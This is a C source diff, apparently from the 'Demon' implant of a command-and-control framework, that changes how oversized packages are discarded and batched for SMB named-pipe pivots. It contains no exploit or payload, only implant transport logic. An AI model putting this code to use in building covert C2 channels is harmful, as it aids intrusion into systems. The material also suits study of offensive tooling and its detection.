@@ -286,7 +286,28 @@ VOID PackageTransmit(
     if ( ! Package ) {
         return;
     }
-        
+
+#if TRANSPORT_SMB
+        // if the package is larger than PIPE_BUFFER_MAX, discard it
+        // TODO: support packet fragmentation
+
+        // size + demon-magic + agent-id + command-id + request-id +
+        // command-id + request-id + buffer-size + Package->Length
+        if ( sizeof( UINT32 ) * 8 + Package->Length > PIPE_BUFFER_MAX )
+        {
+            PRINTF( "Trying to send a package that is 0x%x bytes long, which is longer than PIPE_BUFFER_MAX, discarding...\n", Package->Length )
+
+            // destroy the package
+            if ( Package->Destroy ) {
+                PackageDestroy( Package );
+            }
+
+            // TODO: notify the operator that a package was discarded
+
+            return;
+        }
+#endif
+
     if ( ! Instance.Packages )
     {
         Instance.Packages = Package;
@@ -314,7 +335,6 @@ BOOL PackageTransmitAll(
     PPACKAGE Pkg     = Instance.Packages;
     PPACKAGE Entry   = NULL;
     PPACKAGE Prev    = NULL;
-    UINT32   NumPkgs = 0;
 
 #if TRANSPORT_SMB
     // SMB pivots don't need to send DEMON_COMMAND_GET_JOB
@@ -330,41 +350,14 @@ BOOL PackageTransmitAll(
     {
 #if TRANSPORT_SMB
         // SMB pivots can't send packages greater than PIPE_BUFFER_MAX
-        if ( NumPkgs > 0 && Package->Length + Pkg->Length > PIPE_BUFFER_MAX )
+        if ( Package->Length + sizeof( UINT32 ) * 3 + Pkg->Length > PIPE_BUFFER_MAX )
             break;
-
-        // if a single package is larger than PIPE_BUFFER_MAX, discard it
-        // TODO: support packet fragmentation
-        if ( Pkg->Length > PIPE_BUFFER_MAX )
-        {
-            // TODO: notify the operator that a package was discarded
-            PRINTF( "Trying to send a package that is 0x%x bytes long, which is longer than PIPE_BUFFER_MAX, discarding...\n", Pkg->Length )
-
-            // remove package from chain
-            if ( Prev ) {
-                Prev->Next = Pkg->Next;
-            } else {
-                Instance.Packages = Pkg->Next;
-            }
-
-            Entry = Pkg->Next;
-
-            // free the package
-            if ( Pkg->Destroy ) {
-                PackageDestroy( Pkg );
-            }
-
-            Pkg = Entry;
-
-            continue;
-        }
 #endif
 
         PackageAddInt32( Package, Pkg->CommandID );
         PackageAddInt32( Package, Pkg->RequestID );
         PackageAddBytes( Package, Pkg->Buffer, Pkg->Length );
         Pkg->Included = TRUE;
-        NumPkgs += 1;
 
         // make sure we don't send a package larger than DEMON_MAX_REQUEST_LENGTH
         if ( Package->Length > DEMON_MAX_REQUEST_LENGTH )
